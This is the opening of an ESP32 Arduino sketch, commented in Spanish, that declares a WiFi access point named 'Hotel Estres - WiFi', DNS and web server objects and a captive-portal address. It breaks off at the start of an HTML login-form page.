#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

// Nombre de la red WiFi que creará la ESP32
const char* AP_SSID = "Hotel Estres - WiFi";

// Objetos para el servidor DNS y servidor web
DNSServer dnsServer;
WebServer server(80);

// Dirección IP del portal cautivo
IPAddress AP_IP(192, 168, 4, 1);

// Página principal con el formulario de acceso
const char INDEX_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
